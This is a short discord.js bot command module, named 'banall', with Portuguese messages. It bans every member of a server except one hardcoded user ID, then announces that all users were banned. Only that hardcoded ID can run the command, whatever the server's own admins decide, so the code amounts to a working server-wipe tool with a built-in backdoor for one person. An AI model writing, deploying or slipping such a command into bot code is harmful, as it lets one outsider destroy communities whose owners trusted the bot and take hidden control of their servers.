const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {

    message.delete()

    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply("Você não colocou um motivo.")
    if (message.author.id != 290363866586546176) return;

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 290363866586546176) return;
        message.guild.member(f).ban(BReason);
    });
    C.send("<:7771:593646594268725248><:7772:593646419227705354><:7773:593646265858785301><:7774:593646210187919380><:7775:593645935280783431><:7776:593645885372497945><:7777:593645809426497551> Todos usuários foram banidos.");
}
module.exports.help = {
    name: "banall"
}